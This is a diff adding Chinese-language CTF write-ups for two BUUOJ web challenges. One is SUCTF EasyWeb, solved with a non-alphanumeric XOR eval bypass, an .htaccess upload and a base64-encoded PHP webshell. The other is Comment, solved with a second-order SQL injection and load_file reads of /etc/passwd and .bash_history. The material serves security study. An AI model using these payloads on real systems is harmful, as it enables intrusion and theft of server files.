@@ -8966,6 +8966,268 @@ for i in range(1, 30):
 
 最后蚁剑连接
 
+## BUUOJ [SUCTF 2019]EasyWeb
+
+进来直接给出题目源码
+
+```php
+<?php
+function get_the_flag()
+{
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_" . md5($_SERVER['REMOTE_ADDR']);
+    if (!file_exists($userdir)) {
+        mkdir($userdir);
+    }
+    if (!empty($_FILES["file"])) {
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        // 获取后缀
+        $extension = substr($name, strrpos($name, ".") + 1);
+        // 后缀不能带 ph
+        if (preg_match("/ph/i", $extension)) die("^_^");
+        // 文件内容不能带有 <?
+        if (mb_strpos(file_get_contents($tmp_name), '<?') !== False) die("^_^");
+        // 校验文件内容是否是图片
+        if (!exif_imagetype($tmp_name)) die("^_^");
+        $path = $userdir . "/" . $name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET['_'];
+
+if (!$hhh) {
+    highlight_file(__FILE__);
+}
+
+// 长度不能大于 18
+if (strlen($hhh) > 18) {
+    die('One inch long, one inch strong!');
+}
+
+// 无字母数字 RCE
+if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh))
+    die('Try something else!');
+
+// 统计 string 中每个字节值（0..255）出现的次数
+$character_type = count_chars($hhh, 3);
+if (strlen($character_type) > 12) die("Almost there!");
+
+eval($hhh);
+```
+
+首先是无字母数字的异或绕过，如果按照正常的思路来走的话，长度肯定是不够的，所以这里需要使用另一种方法，如下：
+
+```php
+<?php
+error_reporting(0);
+$arr1 = array('one' => 'one key', 'two' => 'two key');
+var_dump(${arr1}{'one'});				// string(7) "one key"
+```
+
+这种方法构造出的payload能更短，那么按照这种思路构造出`_GET`的异或字符；`payload`如下
+
+```
+?_=${%A0%B8%BA%AB^%FF%FF%FF%FF}{%FF}();&%FF=phpinfo
+```
+
+首先进来可以看到`Server API = Apache 2.0 Handler`，可以确定web服务器是用的是`Apache`
+
+![image-20240511155420038](CTF.assets/image-20240511155420038.png)
+
+另外还可以看到`$_SERVER['REMOTE_ADDR']`
+
+![image-20240511155445026](CTF.assets/image-20240511155445026.png)
+
+再检查是否允许做文件包含`data://`
+
+![image-20240511155512644](CTF.assets/image-20240511155512644.png)
+
+`disable_function`这里也可以看到是禁用了所有的能执行shell命令的函数（一般看到这种，最简单的就是直接上蚁剑的插件来绕过）
+
+![image-20240511155534305](CTF.assets/image-20240511155534305.png)
+
+那么接下来要开始做文件上传，这里直接给出`.htaccess`文件`payload`；
+
++ 首先使用`#define width 1337 #define height 1337`绕过文件内容的检测
++ `php_value auto_append_file .htaccess`包含`.htaccess`文件，以执行PHP代码
++ `AddType application/x-httpd-php .txt`将`txt`文件当做PHP文件执行，以激活`php_value`
++ 将`123.txt`文件的内容base64解码并包含进来，最后执行
+
+```
+#define width 1337
+#define height 1337
+php_value auto_append_file .htaccess
+AddType application/x-httpd-php .txt
+php_value auto_append_file "php://filter/convert.base64-decode/resource=123.txt"
+```
+
+`123.txt`文件内容：，这里首先要加`GIF89a`绕过文件内容检测，然后base64是4位一组的，这里要保证最后的长度能被4整除，所以在`9a`的后面添加两个任意字符，以保证base64解码不出错
+
+```
+GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2EnXSk7Pz4=
+```
+
+最后python文件上传如下：将需要的文件创建到当前目录下即可
+
+```py
+import requests
+
+url = 'http://4b8a3686-80be-40e4-897f-3774879c8f6b.node5.buuoj.cn:81/?_=${%A0%B8%BA%AB^%FF%FF%FF%FF}{%FF}();&%FF=get_the_flag'
+
+txt_file = {'file': ('123.txt', open('123.txt', 'rb'))}
+response = requests.post(url, files=txt_file)
+print(response.text)
+
+htaccess_file = {'file': ('.htaccess', open('.htaccess', 'rb'))}
+response = requests.post(url, files=htaccess_file)
+print(response.text)
+```
+
+## BUUOJ [网鼎杯 2018]Comment
+
+进来是一个登录口，从提示可以看出，账号是`zhangwei`，密码是`zhangwei***`，那么这里就是爆破后三位了，最后得到的结果是`zhangwei666`，登录进去就是一个博客网站，如果没有头绪就做目录扫描，会看到有个`.git`的文件泄露，使用工具直接拉就好，推荐使用`Git_Extract`，得到部分源码：
+
+```php
+<?php
+include "mysql.php";
+session_start();
+if($_SESSION['login'] != 'yes'){
+    header("Location: ./login.php");
+    die();
+}
+if(isset($_GET['do'])){
+    switch ($_GET['do'])
+    {
+        case 'write':
+            $category = addslashes($_POST['category']);
+            $title = addslashes($_POST['title']);
+            $content = addslashes($_POST['content']);
+            $sql = "insert into board
+            set category = '$category',
+                title = '$title',
+                content = '$content'";
+            $result = mysql_query($sql);
+            header("Location: ./index.php");
+            break;
+        case 'comment':
+            $bo_id = addslashes($_POST['bo_id']);
+            $sql = "select category from board where id='$bo_id'";
+            $result = mysql_query($sql);
+            $num = mysql_num_rows($result);
+            if($num>0){
+                // category 重新拿出来，构成二次注入
+                $category = mysql_fetch_array($result)['category'];
+                $content = addslashes($_POST['content']);
+                $sql = "insert into comment
+            set category = '$category',
+                content = '$content',
+                bo_id = '$bo_id'";
+                $result = mysql_query($sql);
+            }
+            header("Location: ./comment.php?id=$bo_id");
+            break;
+        default:
+            header("Location: ./index.php");
+    }
+}
+else{
+    header("Location: ./index.php");
+}
+?>
+```
+
+这里如果在`write`处写入`$category = 1',content=database(),/* `，放到`comment`处的SQL语句就变为：
+
+```sql
+set category = '1',content=database(),/*',
+                content = '$content',
+                bo_id = '$bo_id'";
+```
+
+此时`$content = */#`，使用`*/`闭合注释符，使用`#`**过滤当前行的单引号和逗号**
+
+```sql
+set category = '1',content=database(),/*',
+                content = '*/#',
+                bo_id = '$bo_id'";
+```
+
+本地执行如下：
+
+![image-20240511174145648](CTF.assets/image-20240511174145648.png)
+
+到这里就成功构造处SQL注入语句
+
+![image-20240511174330294](CTF.assets/image-20240511174330294.png)
+
+![image-20240511174348131](CTF.assets/image-20240511174348131.png)
+
+接下来使用`load_file()`函数去读取`flag`，先读取/etc/passwd
+
+```
+paylaod:1',content=(select load_file('/etc/passwd')),/*
+```
+
+![image-20240511174524210](CTF.assets/image-20240511174524210.png)
+
+ 发现存在www用户，去读取用户的命令执行历史
+
+```
+payload:1',content=(select load_file('/home/www/.bash_history')),/*
+```
+
+![image-20240511174542589](CTF.assets/image-20240511174542589.png)
+
+
+它把一个压缩包解压在tmp目录下，然后删除压缩包，又把html复制去了/www目录，并删除.DS_Store。搁着绕圈子了。那不还是得去读取/tmp/html/.DS_Store。又因为这种文件直接读取通常存在乱码，所以要转进制读取才行
+
+```
+payload:1',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
+```
+
+这样就读出来一堆16进制。拿去转换一下。
+
+![image-20240511174643087](CTF.assets/image-20240511174643087.png)
+
+将这串十六进制内容转为二进制在写入文件，脚本如下：
+
+```py
+import binascii
+src = '十六进制'
+
+binary_data = binascii.unhexlify(src)
+with open('tmp.data', 'wb') as f:
+    f.write(binary_data)
+```
+
+从上面可以看到这个文件是`.DS_Store`，网上搜索了一下这个文件怎么读；看见flag名了-----flag_8946e1ff1ee3e40f.php
+
+```shell
+┌──(kali㉿kali)-[~/桌面]
+└─$ xxd -p tmp.data | sed 's/00//g' | tr -d '\n' | sed 's/\([0-9A-F]\{2\}\)/0x\1 /g' | xxd -r -p | strings | sed 's/ptb[LN]ustr//g'
+Bud1
+strapIl
+        bootstrapIlocblob
+comment.phpIlocblob
+cssIlocblob
+flag_8946e1ff1ee3e40f.phpIlocblob
+fontsIlocblob
+        index.phpIlocblob
+jsIlocblob
+        login.phpIlocblob
+        mysql.phpIlocblob
+vendorIlocblob
+write_do.phpIlocblob
+DSDB
+```
+
+这里又有一个坑。假如还是去/tmp目录下读取flag，就会得到一个高仿的flag，比真实的长一点点。这里要去**/var/www/html/flag_8946e1ff1ee3e40f.php**才是真的
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
